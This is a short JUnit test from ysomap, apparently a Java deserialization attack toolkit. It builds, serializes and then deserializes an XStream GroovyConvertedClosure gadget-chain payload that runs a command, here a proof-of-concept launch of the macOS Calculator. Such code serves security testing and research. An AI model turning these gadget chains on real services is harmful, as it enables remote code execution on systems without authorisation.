package ysomap.core.payload.xstream;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.serializer.Serializer;

/**
 * @author wh1t3P1g
 * @since 2020/4/18
 */
public class GroovyConvertedClosureTest {

    @Test
    public void pack() throws Exception {
        Payload payload = new GroovyConvertedClosure();
        Bullet bullet = payload.getDefaultBullet("open /System/Applications/Calculator.app");
        payload.setBullet(bullet);
        Serializer serializer = payload.getSerializer();
        String serialized = (String) serializer.serialize(payload.getObject());
        serializer.serialize(payload.getObject(), System.out);
        Object obj = serializer.deserialize(serialized);
        System.out.println(obj);
    }
}